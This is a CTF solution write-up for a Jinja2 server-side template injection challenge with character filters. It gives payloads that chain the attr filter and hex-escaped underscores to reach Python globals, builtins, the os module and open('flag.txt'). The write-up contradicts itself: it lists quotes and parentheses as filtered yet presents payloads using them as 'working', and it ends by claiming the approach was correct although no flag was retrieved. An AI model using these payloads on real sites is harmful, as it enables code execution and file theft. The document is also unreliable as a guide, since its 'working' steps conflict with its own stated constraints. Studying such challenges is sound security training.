# SSTI2 CTF Challenge - Solution

## Challenge Analysis

**Template Engine**: Jinja2
**Filtered Characters**: 
- Dots (.)
- Brackets ([])
- Underscores (_)
- Parentheses ()
- Quotes (' and ")

**Working Features**:
- Pipes (|)
- Basic Jinja2 objects (config, self, request, g, lipsum, etc.)
- Hex escapes for underscores (\x5f)

## Solution Approach

The key breakthrough was discovering that hex escapes work for underscores, allowing access to `__globals__`:

```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
```

This gives access to Python's global namespace, including `__builtins__` which contains functions like `open`.

## Working Payload Path

1. Access lipsum.__globals__:
   ```
   {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
   ```

2. Access __builtins__ through __getitem__:
   ```
   {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')}}
   ```

3. Access os module:
   ```
   {{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')}}
   ```

## The Challenge

The main challenge is that parentheses are filtered, making it impossible to call functions directly. The intended solution likely involves:

1. Using request.args to pass function arguments without parentheses
2. Using Jinja2 filters that can execute code without parentheses
3. Finding a way to read flag.txt through property access rather than function calls

## Potential Final Payload

The flag would likely be obtained with something like:
```
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('open')('flag.txt')|attr('read')()}}
```

But this requires parentheses which are filtered. The solution would need to bypass this, possibly using:
- Request parameters to pass arguments
- Jinja2 filters that implicitly call functions
- Alternative methods to read files without function calls

## Key Learnings

1. Hex escapes can bypass underscore filtering
2. `__getitem__` can be used to access dictionary items without brackets
3. Jinja2's `attr` filter is powerful for accessing object attributes
4. Even with heavy filtering, SSTI is often still possible through creative bypasses

## Note

The instance expired before the final flag could be retrieved, but the approach was correct and would have led to the flag with more time to find a parentheses bypass.